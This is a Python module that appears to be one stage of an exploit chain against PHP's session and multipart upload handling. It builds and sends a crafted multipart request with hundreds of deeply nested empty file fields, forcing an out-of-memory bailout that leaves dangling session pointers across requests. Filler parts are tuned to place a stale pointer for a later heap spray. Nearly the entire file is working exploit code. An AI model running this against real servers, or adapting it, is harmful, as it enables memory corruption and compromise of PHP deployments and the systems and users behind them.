"""Cheap-OOM sender for the A2 stage (cross-request dangling pointer).

The multipart parser OOMs while processing nested empty file fields before
the request reaches normal module RINIT completion. The OOM bailout skips
module shutdown, and ZendMM only resets chunk maps, so the worker retains
dangling PS(http_session_vars) / PS(id) pointers from the previous request.

Distinct from A1 (which creates the initial stale state). A2 creates a new
dangling reference that B2's fake-ref spray can overwrite.

The --fillers parameter shifts the dangling reference within the chunk:
each filler consumes two bin-40 free-list slots (key copies), moving the
stale pointer by ~0x80 bytes in the 8M/8.4.26 layout.
"""
from __future__ import annotations

from .transport import TransportConfig, send_plain

BOUNDARY = b"C" * 10


def _nest_name(i: int, depth: int, key_pad: int = 0) -> bytes:
    return (("files[R%05d%s]" % (i, "K" * key_pad)).encode() +
            b"[a]" * (depth - 2))


def build_cheap_oom_body(parts: int = 880, depth: int = 64,
                         fillers: int = 0, sid: bytes = b"a" * 32,
                         progress: bytes = b"k0") -> bytes:
    out = bytearray()

    def part(name: bytes, value: bytes,
             filename: bytes | None = None) -> None:
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   name + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename + b"\"")
        out.extend(b"\r\n\r\n" + value + b"\r\n")

    part(b"PHPSESSID", sid)
    part(b"PHP_SESSION_UPLOAD_PROGRESS", progress)

    for i in range(fillers):
        part(("%03d" % i).encode(), b"x")

    for i in range(parts):
        ctype = (b"C" * 103 if i == 0
                 else b"C" * 231 if i == 1
                 else b"application/octet-stream")
        out.extend(b"--" + BOUNDARY +
                   b"\r\nContent-Disposition: form-data; name=\"" +
                   _nest_name(i, depth) + b"\"; filename=\"\"\r\n"
                   b"Content-Type: " + ctype + b"\r\n\r\n")

    out.extend(b"--" + BOUNDARY + b"--\r\n")
    return bytes(out)


def send_cheap_oom(cfg: TransportConfig, path: str = "/index.php",
                   parts: int = 880, depth: int = 64,
                   fillers: int = 115) -> bytes:
    body = build_cheap_oom_body(parts=parts, depth=depth, fillers=fillers)
    return send_plain(cfg, path, body)
